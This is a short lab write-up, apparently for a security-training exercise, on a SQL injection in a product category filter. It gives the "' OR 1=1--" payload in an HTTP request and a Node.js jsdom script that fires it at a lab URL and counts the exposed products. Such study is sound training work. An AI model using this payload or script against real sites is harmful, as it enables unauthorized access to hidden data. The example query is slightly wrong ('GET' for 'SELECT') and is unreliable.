# 1 - Retrieve Hidden Data

### Notes

The SQLi exists in the `category` query parameter used by the product category filter feature:

```http
GET /filter?category=%27+OR+1=1-- HTTP/1.1
```

The underlying query therefor becomes something like:

```sql
GET * FROM products WHERE category='' OR 1=1--';
```

### Scripted Solution

```javascript
const { JSDOM } = require('jsdom')
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const levelUrl = process.env.LEVEL_URL

  // Get number of products visible on lab home page
  console.log('Getting home page product count...')
  const homeDom = await JSDOM.fromURL(levelUrl)
  const homeProductNodes = homeDom.window.document.querySelectorAll(
    '.container-list-tiles div'
  )
  console.log(`Number of home page products: ${homeProductNodes.length}.`)

  // Get number of products after SQL injection exploit
  console.log('Performing SQLi and getting updated product count...')
  const SQLi = "'+OR+1=1--"
  const SQLiDom = await JSDOM.fromURL(`${levelUrl}/filter?category=${SQLi}`)
  const SQLiProductNodes = SQLiDom.window.document.querySelectorAll(
    '.container-list-tiles div'
  )
  console.log(`Number of home page products: ${SQLiProductNodes.length}.`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
